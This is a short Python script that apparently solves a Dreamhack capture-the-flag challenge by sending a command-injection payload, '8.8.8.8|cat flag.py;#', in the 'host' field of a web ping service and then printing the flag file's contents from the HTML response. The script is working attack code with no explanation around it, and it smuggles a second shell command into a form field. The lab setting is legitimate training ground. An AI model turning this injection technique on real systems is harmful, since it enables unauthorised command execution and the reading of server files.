from bs4 import BeautifulSoup
import requests

URL = "http://host3.dreamhack.games:16463/ping"
PAYLOAD = '8.8.8.8|cat flag.py;#'
DATA = {'host': PAYLOAD}

resp = requests.post(URL, data=DATA)

soup = BeautifulSoup(resp.content,"html.parser")
pre = soup.find('pre')
flag = pre.contents[0].replace('\n', '')
print(flag)